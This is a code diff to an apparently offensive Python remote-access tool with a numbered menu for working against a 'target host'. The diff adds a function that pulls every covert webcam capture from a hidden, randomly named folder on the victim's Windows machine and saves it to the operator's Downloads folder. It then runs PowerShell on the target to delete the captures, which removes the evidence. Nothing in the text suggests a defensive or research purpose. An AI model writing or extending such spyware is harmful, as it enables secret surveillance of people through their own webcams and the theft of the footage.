@@ -199,8 +199,21 @@ def install_camcap(ipv4,pword,temp_dir,startup_dir):
     print("\n[*] Downloaded completed...")
     print("[*] Restart target host to execute...")
 
-def fetch_camcapture(ipv4,pword,temp_dir):
-    return
+def fetch_camcapture(ipv4,pword,temp_dir,uname):
+    print("[+] Preparing to fetch all webcam captures...")
+    camcap_folder = f"camcap-{uname}-{get_current_date()}"
+    print("[+] Downloading all cam captures...")
+    remote_download(ipv4,pword,f"{temp_dir}/QKlYTmHhCDy")
+
+    print("[*] Downloaded all cam captures...")
+    print("[+] Saving....")
+    os.system(f"mkdir ~/Downloads/{camcap_folder}")
+    os.system(f"mv ~/Downloads/QKlYTmHhCDy/* ~/Downloads/{camcap_folder}")
+    os.system("rm -rf ~/Downloads/QKlYTmHhCDy")
+    print(f"[*] Saved to \"~/Downloads/{camcap_folder}\"")
+    print("[+] Deleting all captures from remote target....")
+    remote_command(ipv4,pword, f"powershell remove-item -path {temp_dir}/QKlYTmHhCDy/*.bmp -force -recurse")
+    print("[*] Success. Wiped all captures...")
 
 def update():
     return
@@ -250,7 +263,7 @@ def cli(arguments):
                 elif option == "9":
                     install_camcap(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "10":
-                    fetch_camcapture(tgt_ipv4,tgt_pword,tgt_td)
+                    fetch_camcapture(tgt_ipv4,tgt_pword,tgt_td,tgt_uname)
                 elif option in ["config","c"]:
                     show_config(configuration)
                 elif option == "help":
